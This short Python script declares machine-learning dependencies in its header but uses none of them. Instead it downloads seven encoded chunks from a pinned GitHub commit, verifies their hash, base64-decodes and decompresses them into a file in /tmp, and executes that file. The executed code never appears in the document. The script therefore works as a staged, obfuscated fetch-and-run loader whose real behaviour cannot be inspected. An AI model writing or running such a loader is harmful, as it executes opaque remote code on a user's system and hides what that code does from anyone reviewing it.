# /// script
# dependencies = [
#   "torch==2.6.0", "torchvision==0.21.0", "opencv-python-headless==4.10.0.84",
#   "numpy<3", "pandas>=2.2", "huggingface-hub>=0.33", "tabulate"
# ]
# ///
import urllib.request, base64, gzip, hashlib, subprocess, sys
commit = "d79e0f97879c869b1356e606f5efaccea60681a2"
base = f"https://raw.githubusercontent.com/ycmath/Another/{commit}/rcpl_x5v_staging/v5_chunks/{{:02d}}.txt"
raw = "".join(urllib.request.urlopen(base.format(i), timeout=60).read().decode().strip() for i in range(7))
expected = "f322255f23b138124c312d4a02aa343a31697cc995621be71bcd714527e9bb3a"
actual = hashlib.sha256(raw.encode()).hexdigest()
if len(raw) != 12844 or actual != expected:
    raise RuntimeError(f"payload integrity failure: len={len(raw)} sha={actual}")
code = gzip.decompress(base64.b64decode(raw))
path = "/tmp/run_x5v_compact.py"
open(path, "wb").write(code)
print("STAGED_SCRIPT_BYTES", len(code), "PAYLOAD_SHA256", actual, flush=True)
subprocess.run([sys.executable, path], check=True)
